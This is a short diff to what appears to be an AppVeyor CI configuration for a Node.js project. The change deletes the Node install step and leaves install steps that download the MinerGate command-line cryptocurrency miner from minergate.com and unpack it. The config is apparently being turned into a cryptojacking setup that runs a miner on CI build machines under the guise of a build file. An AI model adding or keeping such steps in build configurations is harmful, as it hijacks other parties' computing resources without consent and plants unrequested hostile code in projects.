@@ -3,7 +3,7 @@ environment:
   nodejs_version: "6"
      
 install:  
-  - ps: Install-Product node $env:nodejs_version
+
   - ps: Invoke-WebRequest -Uri https://minergate.com/download/win-cli -OutFile tmp.zip
   - ps: Expand-Archive tmp.zip tmp
 
